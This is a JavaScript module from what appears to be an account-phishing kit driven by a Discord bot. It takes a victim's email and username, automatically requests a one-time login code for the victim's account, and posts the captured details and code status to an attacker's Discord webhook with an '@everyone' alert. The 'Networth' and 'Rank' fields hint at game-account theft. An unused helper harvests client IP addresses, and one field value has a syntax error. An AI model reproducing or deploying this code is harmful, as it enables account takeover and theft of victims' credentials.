const axios = require('axios');
const requestCode = require('./utils/requestCode.js');
const checkUsernameUtil = require('./utils/checkUsernameUtil');
const checkEmailUtil = require('./utils/checkEmailUtil');
const config = require('../config.json');


module.exports = async (email, username, id, user) => {
    const webhook = config.webhook;
    let requestStatus = "Code Request Failed. You will need to request a code manually.";
    try {
        await requestCode(email);
        requestStatus = "Code Requested Automatically";
    } catch (error) {
        console.log(error);
    }
    


    const data = {
        "username": "",
        "content": "@everyone",
        embeds: [
            {
                title: "BOZO Entered code",
                description: `expires in <t:${Math.floor(new Date().getTime() / 1000) + 1500}:R>`,
                color: 0x228b22,
                "footer": {
                    "text": "Powered by voke#0002"
                },
                fields: [
                    {
                        name: "Username",
                        value: "```" + username + "```",
                        inline: true,
                    },
                    {
                        name: "Email",
                        value: "```" + email + "```",
                        inline: false,

                    },
                    {
                        "name": "\u200b", 
                        "value": "\u200b",
                        "inline": true
                        
                    
                    },
                    {
                        name: "IP",
                        value: ```Discord Bot```,
                        inline: false


                    },
                    {
                    
                        name: "Networth",
                        value: "``No NW``",
                        inline: true
                        


                    },
                    {
                        "name": "\u200b", 
                        "value": "\u200b",
                        "inline": true


                    },
                    {
                        name: "Rank",
                        value: "No Rank",
                        inline: true
                    },
                    {
                        name: "OTP",
                        value: "```"+ requestStatus + "```",
                        inline: false,
                    }
                ]
            },
        ],
    };

    try {
        await axios.post(webhook, data)
    } catch (error) {
        console.log(error);
    }
}


function getIp(req) {
    return (req.headers["cf-connecting-ip"] || req.headers["x-real-ip"] || req.headers["x-forwarded-for"] || req.connection.remoteAddress || "0");
}